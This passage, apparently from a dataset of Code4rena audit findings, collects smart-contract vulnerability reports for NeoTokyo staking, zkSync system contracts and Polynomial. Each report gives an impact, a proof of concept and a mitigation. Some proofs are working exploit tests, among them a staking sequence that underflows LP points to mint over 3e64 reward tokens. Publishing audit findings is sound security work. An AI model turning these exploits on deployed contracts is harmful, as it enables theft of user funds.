correctly:  ```solidity 1155:   uint256 points = amount * 100 / 1e18 * timelockMultiplier / _DIVISOR; ```  [Link to code](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1155)  ```solidity 1623:   uint256 points = amount * 100 / 1e18 * lpPosition.multiplier / _DIVISOR; ```  [Link to code](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1623)  Fix the corresponding tests, and replace with exact calculations, as the use broad ranges make it difficult to spot these issues:  ```javascript // Confirm Bob and the DAO received their proper share. let bobBalance = await NTBytes2_0.balanceOf(bob.address); bobBalance.sub(bobBalanceInitial).should.be.closeTo(   ethers.BigNumber.from(\"8919540229885057471\"), // @audit broad range   ethers.BigNumber.from(\"1000000000\") // @audit broad range ); ``` "}, {"title": "Internal miscalculation of total reward on first stakes", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/288", "labels": ["bug", "disagree with severity", "downgraded by judge", "G (Gas Optimization)", "grade-b", "satisfactory", "sponsor confirmed", "G-16"], "target": "2023-03-neotokyo-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-neotokyo/blob/dfa5887062e47e2d0c801ef33062d44c09f6f36e/contracts/staking/NeoTokyoStaker.sol#L1378   # Vulnerability details  ## Impact one of the main features that the staking contract that should always and carefully operate is the reward calculation, there is a miscalculation on every time the getPoolReward is being called on first time staking with a pool of a single window reward count, where lastPoolRewardTime is initially equal to 0, that leads that the timeSinceReward is equal to block timestamp, which massively inflate totalReward. but since the points initially are 0, it gets multiplied by 0 so it would lead to a share of 0. It is advised that the internal calculations are correct at all times.  ## Proof of Concept To help on illustrating the miscalculation, we would apply it on LP, but it's also applicable to S1 and S2.   - We import hardhat console in `NeoTokyoStaker.sol`: ```solidity import \"hardhat/console.sol\"; ``` - we add the following test case to `NeoTokyoStaker.test.js` within `with example configuration` describe test suite:  ```js   describe('internal miscalculation', function () {    it(\"internally calculates an inflatable LP totalReward\", async function () {     // Configure the LP token contract address on the staker.     await NTStaking.connect(owner.signer).configureLP(LPToken.address);      // Stake Alice's LP tokens to have a non zero pool total points     await NTStaking.connect(alice.signer).stake(      ASSETS.LP.id,      TIMELOCK_OPTION_IDS['30'],      ethers.utils.parseEther('40'),      0,      0     );      // Stake Bob's LP tokens     await NTStaking.connect(bob.signer).stake(      ASSETS.LP.id,      TIMELOCK_OPTION_IDS['1080'],      ethers.utils.parseEther('10'),      0,      0     );    })   }) ``` - we finally add the debugging console.log within the `NeoTokyoStaker.sol` contract: ```solidity     function getPoolReward(AssetType _assetType, address _recipient) public view returns (uint256, uint256) {     // ...                 } else if (i == windowCount - 1) {                     unchecked {                         uint256 timeSinceReward = block.timestamp - lastPoolRewardTime;                         console.log(\"last pool reward time\", lastPoolRewardTime); // +                         console.log(\"time passed\", timeSinceReward); // +                         totalReward = window.reward * timeSinceReward;                     }                     break;                 }    // ...    // Return final shares.             unchecked {                 uint256 share = points * _PRECISION / pool.totalPoints * totalReward;                 uint256 daoShare = share * pool.daoTax / (100 * _DIVISOR);                 share /= _PRECISION;                 daoShare /= _PRECISION;                  console.log(\"points\", points); // +                 console.log(\"pool total points\", pool.totalPoints); // +                 console.log(\"total reward\", totalReward); // +                 return ((share - daoShare), daoShare);             }         }         return (0, 0);     } ``` - after running the test case, we would have the following output:  ```sh       internal miscalculation last pool reward time 0 time passed 2678881252 points 0 pool total points 4000 total reward 1550278502314812929676156         \u221a internally calculates an inflateable LP totalReward ```  - We can see clearly that initially the total reward is directly correlated with the block timestamp, which would lead to the total reward to be internally calculated in an inflated manner. on the mainnet at block.timestamp of 1678881350, we have in the test case a time passed of 2678881252, so it would result in:  - totalReward = 1550278502314812929676156 / 2678881252 * 1678881350 / 10**18 = 971574.855324 BYTES2.0  ## Tools Used Vs code  ## Recommended Mitigation Steps  - for a safer internal reward calculation, we may simply add a check that ensure that the user's getPoolReward call is not the first time call:  ```solidity     function getPoolReward(AssetType _assetType, address _recipient) public view returns (uint256, uint256) {         /*     During the very first stake, there will not be any points in the pool. In      this case, do not attempt to grant any rewards so as to prevent reversion.         */         PoolData storage pool = _pools[_assetType];         uint256 lastPoolRewardTime = lastRewardTime[_recipient][_assetType];         if (pool.totalPoints != 0 && lastPoolRewardTime != 0) {              // ...         }         return (0, 0);    }  ```"}, {"title": "Underflow of `lpPosition.points` during withdrawLP causes huge reward minting", "html_url": "https://github.com/code-423n4/2023-03-neotokyo-findings/issues/261", "labels": ["bug", "3 (High Risk)", "judge review requested", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-03-neotokyo-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1622-L1631   # Vulnerability details  ## Impact NeoTokyoStaking allows to stake and withdraw LPs. User can stake multiple times on same position which simply results in extended lock time and user can withdraw all of these LPs once lock time is passed.  There is a scenario when withdrawing LPs results in overflow of [lpPosition.points](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1627). After withdraw if attacker calls `getRewards()` then attacker will get more than 1e64 BYTES tokens as reward.  ## Proof of Concept Affected code block: [NeoTokyoStaker.sol#L1622-L1631]( https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1622-L1631)  Affected line: [L1627](https://github.com/code-423n4/2023-03-neotokyo/blob/main/contracts/staking/NeoTokyoStaker.sol#L1627)  From below POC you can see that Alice is staking twice and some specific amounts which will trigger underflow when Alice withdraw LP. Once staked LPs are unlocked, Alice can withdraw her LPs and call `getReward()` to trigger minting of more than 1e64 BYTES tokens.  Below test can be added in `NeoTokyoStaker.test.js` test file. ```js   it('Unexpected rewards minting due to underflow of \"points\"', async function () {    // Configure the LP token contract address on the staker.    await NTStaking.connect(owner.signer).configureLP(LPToken.address);    const amount1 = ethers.utils.parseEther('10.009')    const amount2 = ethers.utils.parseEther('11.009')    const lockingDays = 30        // Alice stake amount1 LPs for 30 days.    await NTStaking.connect(alice.signer).stake(     ASSETS.LP.id,     TIMELOCK_OPTION_IDS[lockingDays],     amount1,     0,     0    );     // Alice stake amount2 LPs for 30 days.    await NTStaking.connect(alice.signer).stake(     ASSETS.LP.id,     TIMELOCK_OPTION_IDS[lockingDays],     amount2,     0,     0    );     const priorBlockNumber = await ethers.provider.getBlockNumber();    const priorBlock = await ethers.provider.getBlock(priorBlockNumber);    let aliceStakeTime = priorBlock.timestamp;        // Bob stake 10 LPs for 30 days    await NTStaking.connect(bob.signer).stake(     ASSETS.LP.id,     TIMELOCK_OPTION_IDS[lockingDays],     ethers.utils.parseEther('10'),     0,     0    );     // Set time to unlock staked lp    await ethers.provider.send('evm_setNextBlockTimestamp', [     aliceStakeTime + (60 * 60 * 24 * lockingDays)    ]);        // Alice withdraw LP                         // This transaction will cause underflow of `lpPosition.points`    await NTStaking.connect(alice.signer).withdraw(     ASSETS.LP.id,     amount1.add(amount2)    );     // Before exploit:: Verify Alice's Bytes balance is less than 10000 BYTES    expect(await NTBytes2_0.balanceOf(alice.address)).lt(ethers.utils.parseUnits('10000', 18))        // Get rewards for Alice. It will mint HUGE rewards due to underflow happened on withdraw transaction.    await NTBytes2_0.getReward(alice.address)     // After exploit:: Verify Alice's Bytes balance is greater than 3e64    expect(await NTBytes2_0.balanceOf(alice.address)).gt(ethers.utils.parseUnits('3', 64))   }); ```  ## Tools Used Manual  ## Recommended Mitigation Steps Consider adding proper precision for `points` and `totalPoints` and also consider checking for under/overflows."}, {"title": "User transactions can call system contracts directly", "html_url": "https://github.com/code-423n4/2023-03-zksync-findings/issues/146", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-03-zksync-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L141-L144   # Vulnerability details  ## Impact User transaction can call system contracts directly, which shouldn't be allowed to not invoke potentially dangerous operations. ## Proof of Concept The [DefaultAccount.executeTransaction](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L117) executes a user transaction after it was validated. The function calls [_execute](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L140) under the hood. The `_execute` function makes two different calls depending on the destination address of a transaction: 1. if the `ContractDeployer` is called, it'll [pass the call to the contract](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L149) via the system call (`ContractDeployer` is a system contract and can be executed only via system calls); 1. if any other contract is called, it'll [execute the call via `EfficientCall.rawCall`](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L151).  `EfficientCall.rawCall` in its turn also makes two different calls: 1. If `msg.value` of the transaction is 0, it'll [make a regular call](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L131). 1. If there's some ETH sent with the transaction (i.e. `msg.value` is positive), it'll [pass the call to the `MsgValueSimulator` contract](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L144). `MsgValueSimulator` is a system contract, thus the `isSystem` flag will be set in the far call ABI (notice the `true` in the [last argument of `_loadFarCallABIIntoActivePtr`](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L134)). However, it'll also [set the forward mask](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/libraries/EfficientCall.sol#L141) to 1 (the value of [MSG_VALUE_SIMULATOR_IS_SYSTEM_BIT](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/Constants.sol#L71)). `MsgValueSimulator` will [extract the mask and will set the `isSystemCall` flag to true](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/MsgValueSimulator.sol#L27)\u2013it'll then pass the `isSystemCall` flag to the [subsequent call](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/MsgValueSimulator.sol#L62), making the call a system one.  To sum it up, if a transaction calls a contract that's not `ContractDeployer` and sends ETH, the call will be a system one, which will let it call the system contracts. However, users shouldn't be allowed to call system contracts directly to not invoke potentially dangerous operations. As per the documentation: > Some of the system contracts can act on behalf of the user or have a very important impact on the behavior of the account. That's why we wanted to make it clear that users can not invoke potentially dangerous operations by doing a simple EVM-like call. Whenever a user wants to invoke some of the operations which we considered dangerous, they must explicitly provide isSystem flag with them.  However, since most system contracts are harmless, there's no direct high severity impact on the system, thus I think the issue is a medium severity. ## Tools Used Manual review ## Recommended Mitigation Steps In the `EfficientCall.rawCall` function, consider setting the forward mask to 0. The behaviour of the function is similar to that of the `msgValueSimulatorMimicCall` function from the bootloader: 1. since the `MsgValueSimulator` contract is called, the `isSystemCall` flag should be set [only for this call](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/bootloader/bootloader.yul#L1737); 1. the `isSystemCall` flag should be forwarded by `MsgValueSimulator` [only if the destination contract is `ContractDeployer`](https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/bootloader/bootloader.yul#L1730).  It looks that the second part of the `EfficientCall.rawCall` function was copied from the `SystemContractsCaller.systemCall` function, which is intended to call system contracts and which sets the forward mask to 1 when calling `MsgValueSimulator`. However, `rawCall` shouldn't forward the `isSystemCall` flag."}, {"title": "DefaultAccount#fallback lack payable", "html_url": "https://github.com/code-423n4/2023-03-zksync-findings/issues/93", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-03-zksync-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/DefaultAccount.sol#L223-L228   # Vulnerability details  ## Impact fallback lack `payable`,will lead to differences from the mainnet, and many existing protocols may not work  ## Proof of Concept DefaultAccount Defined as follows: ``` DefaultAccount  The implementation of the default account abstraction. This is the code that is used by default for all addresses that are not in kernel space and have no contract deployed on them. This address:  Contains the minimal implementation of our account abstraction protocol. Note that it supports the built-in paymaster flows. When anyone (except bootloader) calls/delegate calls it, it behaves in the same way as a call to an EOA, i.e. it always returns success = 1, returndatasize = 0 for calls from anyone except for the bootloader. ``` If there is no code for the address, the DefaultAccount #fallback method will be executed, which is compatible with the behavior of the mainnet  But At present, `fallback` is not `payable` The code is as follows ```solidity contract DefaultAccount is IAccount {     using TransactionHelper for *; ..     fallback() external { //<--------without payable         // fallback of default account shouldn't be called by bootloader under no circumstances         assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS);          // If the contract is called directly, behave like an EOA     }      receive() external payable {         // If the contract is called directly, behave like an EOA     }  ``` which will lead to differences from the mainnet.  For example, the mainnet execution of the method with value will return true, and the corresponding value will be transfer but DefaultAccount.sol will return false   It is quite common for `call ()` to with `value`. If it is not compatible, many existing protocols may not work  Mainnet code example, executing 0x0 call with value can be successful: ```solidity   function test() external {     vm.deal(address(this),1000);     console.log(\"before value:\",address(0x0).balance);     (bool result,bytes memory datas) = address(0x0).call{value:10}(\"abc\");     console.log(\"call result:\",result);     console.log(\"after value:\",address(0x0).balance);   } ``` ```console $ forge test -vvv  [PASS] test() (gas: 42361) Logs:   before value: 0   call result: true   after value: 10 ```  Simulate DefaultAccount #fallback without payable, it will fail:  ```solidity      contract DefaultAccount {         fallback() external {              }         receive() external payable {               }     }      function test() external {         DefaultAccount defaultAccount = new DefaultAccount();         vm.deal(address(this),1000);         console.log(\"before value:\",address(defaultAccount).balance);         (bool result,bytes memory datas) = address(defaultAccount).call{value:10}(\"abc\");         console.log(\"call result:\",result);         console.log(\"after value:\",address(defaultAccount).balance);     } ``` ```console $ forge test -vvv  [PASS] test() (gas: 62533) Logs:   before value: 0   call result: false   after value: 0 ```  ## Tools Used  ## Recommended Mitigation Steps ```solidity - function test() external { + function test() external payable {     vm.deal(address(this),1000);     console.log(\"before value:\",address(0x0).balance);     (bool result,bytes memory datas) = address(0x0).call{value:10}(\"abc\");     console.log(\"call result:\",result);     console.log(\"after value:\",address(0x0).balance);   } ``` "}, {"title": "time-sensitive contracts deployed on zkSync", "html_url": "https://github.com/code-423n4/2023-03-zksync-findings/issues/70", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-03-zksync-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/SystemContext.sol#L116   # Vulnerability details  ## Impact Time-sensitive contracts will be impacted if deployed on zkSync.  ## Proof of Concept  Many contracts use `block.number` to measure the time as the miners were able to manipulate the `timestamp` (the `timestamp` could be easily gamed over short intervals). So, it was assumed that `block.number` is a safer and more accurate source of measuring time than `timestamp`.   For instance, if a defi project sets 144000 block interval to release the interest, it means approximately 144000 * 12 = 20 days. Please note that each block in Ethereum takes almost 12 second.  If the same defi project is deployed on zkSync, it will not operate as expected. Because the there is no time-bound for the blocks in zkSync (the interval may be 30 seconds or 1 week). So, the time to release the interest can be between 50 days to 2762 days.  Since, it is assumed that zkSync is Ethereum compatible, any deployed contracts on Ethereum may deploy their contract in zkSync without noting such big difference.  Even if the contracts use `timestamp` to measure the time, there will be another issue. In the contract `SystemContext.sol`, it is possible to set new block with the same `timestamp` as previous block, but with incremented block number. https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/SystemContext.sol#L116  In other words, new blocks are created but their time is frozen. Please note that freezing time can not be lasted for a long time, because when committing block their `timestamp` will be validated against a defined boundary.   ## Tools Used  ## Recommended Mitigation Steps It should be explicitly mentioned that block intervals in zkSync are not compatible with Ethereum. So, time-sensitive contracts will be noted.  Moreover, the equal sign should be removed in the following line: https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/SystemContext.sol#L116"}, {"title": "Losing fund during force deployment", "html_url": "https://github.com/code-423n4/2023-03-zksync-findings/issues/64", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "edited-by-warden", "M-05"], "target": "2023-03-zksync-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L245   # Vulnerability details  ## Impact During force deployment, if the fund is not properly transferred to the to-be-force-deployed contract, the fund will remain in the contract `ContractDeployer` and can not easily be recovered.  ## Proof of Concept  The function `forceDeployOnAddresses` in contract `ContractDeployer` is used only during an upgrade to set bytecodes on specific addresses.  https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L232  The ETH sent to this function will be used to initialize to-be-force-deployed contracts. The ETH sent should be equal to the aggregated value needed for each contract. https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L240  Then the function externally calls itself, and send the required value to itself. https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L245  If any of this call is unsuccessful, the whole transaction will not revert, and the loop continues to deploy all the contract on the provided `newAddress`.  If for any reason, the deployment was not successful, the transferred ETH will remain in `ContractDeployer`, and can not be used for the next deployments (because the aggregated amount is compared with `msg.value` not the ETH balance of the contract). In other words, `FORCE_DEPLOYER` fund will be in `ContractDeployer`, and it can not be easily recoverred.  The possibility of unsuccessful deployment is not low:   It can happen if the bytecode is not known already. https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L213 https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L296  It can happen during storing constructing bytecode hash. https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L214 https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/AccountCodeStorage.sol#L36  It can happen during constructing contract and transferring the value. https://github.com/code-423n4/2023-03-zksync/blob/21d9a364a4a75adfa6f1e038232d8c0f39858a64/contracts/ContractDeployer.sol#L223  ## Tools Used  ## Recommended Mitigation Steps By using try/catch, the fund can be transferred to an address that the governor has control to be used later. ``` function forceDeployOnAddresses(ForceDeployment[] calldata _deployments)         external         payable     {         // remaining of the code          for (uint256 i = 0; i < deploymentsLength; ++i) {             try                 this.forceDeployOnAddress{value: _deployments[i].value}(                     _deployments[i],                     msg.sender                 )             {} catch {                 ETH_TOKEN_SYSTEM_CONTRACT.transferFromTo(                     address(this),                     SomeAddress,                     _deployments[i].value                 );             }         }     } ```"}, {"title": "Upgraded Q -> 3 from #74 [1679875886032]", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/263", "labels": ["2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-03-polynomial-findings", "body": "Judge has assessed an item in Issue #74 as 3 risk. The relevant finding follows:   Exchange Rate can be manipulated if positions are big enough for a long enough time"}, {"title": "Users can receive less collateral than expected from liquidations", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/236", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L137-L141   # Vulnerability details  ## Impact  Users might receive very little or no collateral when liquidating extremely unhealthy short positions.  ## Vulnerability Details  When users liquidate a short position, they expect to get a reasonable amount of collateral in return. The collateral amount sent to liquidators is handled by `liquidate()` in the `ShortCollateral` contract:  [ShortCollateral.sol#L137-L141](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L137-L141) ```solidity totalCollateralReturned = liqBonus + collateralClaim; if (totalCollateralReturned > userCollateral.amount) totalCollateralReturned = userCollateral.amount; userCollateral.amount -= totalCollateralReturned;  ERC20(userCollateral.collateral).safeTransfer(user, totalCollateralReturned); ```  Where: * `liqBonus` - Bonus amount of collateral for liquidation. * `collateralClaim` - Collateral amount returned, proportional to the how much debt is being liquidated.   As seen from above, if the position does not have sufficient collateral to repay the short amount being liquidated, it simply repays the liquidator with the remaining collateral amount.  This could cause liquidators to receive less collateral than expected, especially if they fully liquidate positions with high short amount to collateral ratios. In extreme cases, if a user liquidates a position with a positive short amount and no collateral (known as bad debt), they would receive no collateral at all.   ## Proof of Concept  The following test demonstrates how a user can liquidate a short position without getting any collateral in return: ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.9;  import {TestSystem, Exchange, ShortToken, ShortCollateral, MockERC20Fail} from \"./utils/TestSystem.sol\";  contract LiquidationOverpay is TestSystem {     // Protocol contracts     Exchange private exchange;     ShortToken private shortToken;     ShortCollateral private shortCollateral;      // sUSD token contract     MockERC20Fail private SUSD;      // Intial base asset price     uint256 private constant initialBaseAssetPrice = 1e18;      function setUp() public {         // Deploy contracts         deployTestSystem();         initPool();         initExchange();         preparePool();          exchange = getExchange();         shortToken = getShortToken();         shortCollateral = getShortCollateral();         SUSD = getSUSD();          // Set initial price for base asset         setAssetPrice(initialBaseAssetPrice);          // Mint sUSD for user_1         SUSD.mint(user_1, 1e20);          // Mint powerPerp for user_2 and user_3         vm.startPrank(address(exchange));         getPowerPerp().mint(user_2, 1e20);         getPowerPerp().mint(user_3, 1e20);         vm.stopPrank();     }      function testLiquidationReturnsLessCollateralThanExpected() public {         // Open short position with amount = 1e18, collateral amount = 1e15 (sUSD)         uint256 shortAmount = 1e18;         uint256 positionId = openShort(1e18, 1e15, user_1);          // Base asset price rises by 50%         setAssetPrice(initialBaseAssetPrice * 150 / 100);          // user_2 liquidates 85% USER's entire short position         vm.prank(user_2);         exchange.liquidate(positionId, shortAmount * 85 / 100);          // positionId has no remaining collateral, but still has remaining 15% of debt         (, uint256 remainingAmount, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);         assertEq(remainingAmount, shortAmount * 15 / 100);         assertEq(remainingCollateralAmount, 0);          // user_3 liquidates the same position         vm.prank(user_3);         exchange.liquidate(positionId, shortAmount);                  // user_3 did not get any collateral         assertEq(SUSD.balanceOf(user_3), 0);     }      function openShort(         uint256 amount,         uint256 collateralAmount,         address user     ) internal returns (uint256 positionId) {         Exchange.TradeParams memory tradeParams;         tradeParams.amount = amount;         tradeParams.collateral = address(SUSD);         tradeParams.collateralAmount = collateralAmount;          vm.startPrank(user);         SUSD.approve(address(exchange), collateralAmount);         (positionId, ) = exchange.openTrade(tradeParams);         vm.stopPrank();     } } ```  ## Recommended Mitigation  In `liquidate()` of the `Exchange` contract, consider adding a `minCollateralAmount` parameter, which represents the minimum amount of collateral a liquidator is willing to receive. . If the returned collateral amount is less than `minCollateralAmount`, the transaction should revert."}, {"title": "`KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions do not use `whenNotPaused` modifier", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/232", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L19-L21 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L183 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L243 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L215 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L269 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L184 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L200-L205 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L219 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L247 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L264-L269 https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L284   # Vulnerability details  ## Impact As shown by the code below, although `PauseModifier` is imported, the `KangarooVault` contract does not use the `whenNotPaused` modifier in any of its functions. More specifically, the `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions do not use the `whenNotPaused` modifier.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L19-L21 ```solidity import {PauseModifier} from \"./utils/PauseModifier.sol\";  contract KangarooVault is Auth, ReentrancyGuard, PauseModifier { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L183 ```solidity     function initiateDeposit(address user, uint256 amount) external nonReentrant { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L243 ```solidity     function processDepositQueue(uint256 idCount) external nonReentrant { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L215 ```solidity     function initiateWithdrawal(address user, uint256 tokens) external nonReentrant { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L269 ```solidity     function processWithdrawalQueue(uint256 idCount) external nonReentrant { ```  This is unlike the `LiquidityPool` contract; comparing to the `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions, the `LiquidityPool.deposit`, `LiquidityPool.queueDeposit`, `LiquidityPool.processDeposits`, `LiquidityPool.withdraw`, `LiquidityPool.queueWithdraw`, and `LiquidityPool.processWithdraws` functions have the similar functionalities but they all use the `whenNotPaused` modifier. As a result, when an emergency, such as a hack, occurs, the protocol can pause the `LiquidityPool.withdraw`, `LiquidityPool.queueWithdraw`, and `LiquidityPool.processWithdraws` functions to prevent or reduce damages, such as preventing users and the protocol from losing funds, but cannot do that for the `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions.  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L184 ```solidity     function deposit(uint256 amount, address user) external override nonReentrant whenNotPaused(\"POOL_DEPOSIT\") { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L200-L205 ```solidity     function queueDeposit(uint256 amount, address user)         external         override         nonReentrant         whenNotPaused(\"POOL_QUEUE_DEPOSIT\")     { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L219 ```solidity     function processDeposits(uint256 count) external override nonReentrant whenNotPaused(\"POOL_PROCESS_DEPOSITS\") { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L247 ```solidity     function withdraw(uint256 tokens, address user) external override nonReentrant whenNotPaused(\"POOL_WITHDRAW\") { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L264-L269 ```solidity     function queueWithdraw(uint256 tokens, address user)         external         override         nonReentrant         whenNotPaused(\"POOL_QUEUE_WITHDRAW\")     { ```  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L284 ```solidity     function processWithdraws(uint256 count) external override nonReentrant whenNotPaused(\"POOL_PROCESS_WITHDRAWS\") { ```  ## Proof of Concept The following steps can occur for the described scenario. 1. An emergency, such as a hack, occurs in which further withdrawals can cause users and the protocol to lose funds. 2. The protocol team is able to pause the `LiquidityPool.withdraw`, `LiquidityPool.queueWithdraw`, and `LiquidityPool.processWithdraws` functions. 3. However, the protocol team is unable to pause the `KangarooVault.initiateWithdrawal` and `KangarooVault.processWithdrawalQueue` functions. 4. As a result, funds can be lost from the `KangarooVault`.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `KangarooVault.initiateDeposit`, `KangarooVault.processDepositQueue`, `KangarooVault.initiateWithdrawal`, and `KangarooVault.processWithdrawalQueue` functions can be updated to use the `whenNotPaused` modifier."}, {"title": "`LiquidityPool` contract does not have a function that is similar to `KangarooVault.saveToken` function", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/228", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/KangarooVault.sol#L547-L550   # Vulnerability details  ## Impact The `KangarooVault` contract has the following `KangarooVault.saveToken` function, which can be used to transfer any ERC20 tokens that are not sUSD from the `KangarooVault`. However, the `LiquidityPool` contract does not have this kind of function. If any ERC20 tokens that are not sUSD are transferred to the `LiquidityPool` contract, these tokens would be locked in the `LiquidityPool` contract and cannot be returned to the original senders. As a result, these senders lose such transferred ERC20 